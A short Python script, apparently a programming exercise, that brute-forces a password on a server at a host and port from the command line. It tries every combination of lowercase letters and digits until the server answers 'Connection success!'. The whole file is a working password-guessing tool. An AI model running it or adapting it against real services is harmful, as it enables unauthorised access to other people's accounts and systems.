import socket
import sys
import string
import itertools


class Connection():
    def __init__(self, host, port):
        self.hostname = host
        self.port = int(port)
        self.sock = socket.socket()
        self.myList = list(string.ascii_lowercase) + list(str(1234567890))
        self.connect()

    def connect(self):
        with socket.socket() as self.sock:
            address = (self.hostname, self.port)
            self.sock.connect(address)
            self.hacks()

    def send_receive(self, msg):
        data = msg.encode()
        # sending through socket
        self.sock.send(data)
        response = self.sock.recv(1024)
        response = response.decode()
        return response

    def hacks(self):
        for i in range(1, len(self.myList)):
            items = itertools.product(self.myList, repeat=i)
            for psw in items:
                message = ''.join(psw)
                pass_status = self.send_receive(message)
                if pass_status == 'Connection success!':
                    print(message)
                    quit()
        print('Too many attempts')


args = sys.argv
connection = Connection(host=args[1], port=args[2])
